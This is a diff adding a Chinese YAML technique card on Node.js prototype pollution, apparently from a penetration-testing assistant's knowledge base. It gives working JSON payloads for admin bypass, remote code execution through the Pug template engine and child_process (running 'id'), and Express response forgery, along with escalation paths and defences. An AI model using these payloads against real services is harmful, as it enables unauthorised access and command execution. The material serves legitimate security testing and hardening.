@@ -1,0 +1,80 @@
+# 技术卡片: 原型污染 (Prototype Pollution) - Node.js __proto__ 注入
+# 分类: code-audit / prototype-pollution
+# 版本: 1.0
+# 日期: 2026-08-23
+# 来源: CWE-1321
+
+id: "code-audit-prototype-pollution"
+name: "Node.js 原型污染 __proto__ 注入"
+category: "code-audit"
+subcategory: "prototype-pollution"
+severity: "high"
+
+description: |
+  JavaScript 对象通过原型链继承属性。当应用使用 merge/extend/deep-clone
+  等函数递归合并用户可控对象，且未过滤 __proto__ / constructor / prototype
+  键时，攻击者可向 Object.prototype 注入任意属性，污染全局所有对象。
+  常见后果：权限绕过、RCE（配合模板引擎或 child_process）、DoS、XSS。
+
+trigger_signals:
+  - "应用使用 lodash < 4.17.12 的 _.merge / _.defaultsDeep / _.set"
+  - "自定义 merge/extend/clone 递归合并 JSON body 与默认配置"
+  - "接口接收 JSON 对象并做深度合并（配置文件导入、批量更新、模板参数）"
+  - "Node.js 后端，合并逻辑无对象键白名单"
+  - "黑名单过滤 'constructor' 但漏掉 '__proto__' 或 'prototype'"
+
+payloads:
+  - technique: "__proto__ 基础注入"
+    payload: '{"__proto__":{"isAdmin":true}}'
+    note: "污染后任意普通对象读取 isAdmin 变为 true，实现权限绕过"
+  - technique: "constructor.prototype 变体"
+    payload: '{"constructor":{"prototype":{"isAdmin":true}}}'
+    note: "绕过仅过滤 __proto__ 键的过滤器"
+  - technique: "配合模板引擎 RCE (Pug)"
+    payload: '{"__proto__":{"block":{"type":"Text","line":"process.mainModule.require(\"child_process\").execSync(\"id\")"}}}'
+    note: "Pug/Handlebars 等模板引擎读取原型链属性导致任意代码执行"
+  - technique: "配合 child_process execFile RCE"
+    payload: '{"__proto__":{"shell":"/bin/sh","argv0":"console.log(require(\"child_process\").execSync(\"id\").toString())//"}}'
+    note: "execFile/execFileSync 未显式指定 options.shell 时被污染"
+  - technique: "Status/Body 污染绕过鉴权 (Express)"
+    payload: '{"__proto__":{"status":202,"body":"{\"ok\":1}"}}'
+    note: "中间件/API 校验读取污染后的 status 与 body 返回伪造结果"
+
+success_indicators:
+  - "普通对象读取到注入属性（如 ({}).isAdmin === true）"
+  - "权限校验被绕过，返回管理员数据"
+  - "模板渲染触发命令执行回显（id/whoami 输出）"
+  - "Object.prototype 被修改，console.log(({}).polluted) 可验证"
+
+prerequisites:
+  - "Node.js 后端，存在不安全的深度合并/克隆入口"
+  - "用户输入可到达 merge 函数的 source 参数"
+  - "无 __proto__/constructor/prototype 键过滤"
+  - "目标未冻结 Object.prototype"
+
+upgrade_paths:
+  - "原型污染 → 模板引擎 RCE"
+  - "原型污染 → child_process RCE"
+  - "原型污染 → 权限绕过 → 越权数据泄露"
+
+defense:
+  - "升级 lodash 到 >= 4.17.12"
+  - "合并时禁用/过滤 __proto__、constructor、prototype 键"
+  - "使用 Object.create(null) 创建纯字典对象"
+  - "Object.freeze(Object.prototype) 冻结全局原型"
+  - "优先使用 Map 存储键值，避免原型链查找"
+
+sources:
+  - agent: "渗透测试AI助手"
+    date: "2026-08-23"
+  - ref: "CWE-1321"
+  - ref: "PortSwigger: Prototype pollution"
+  - ref: "HackTricks: NodeJS Prototype Pollution"
+
+tools:
+  - "Burp Suite (DOM Invader)"
+  - "ppfuzz"
+confidence: "high"
+limitations:
+  - "需目标存在不安全合并入口，黑盒探测成本较高"
+  - "部分现代框架已冻结原型或改用安全合并"
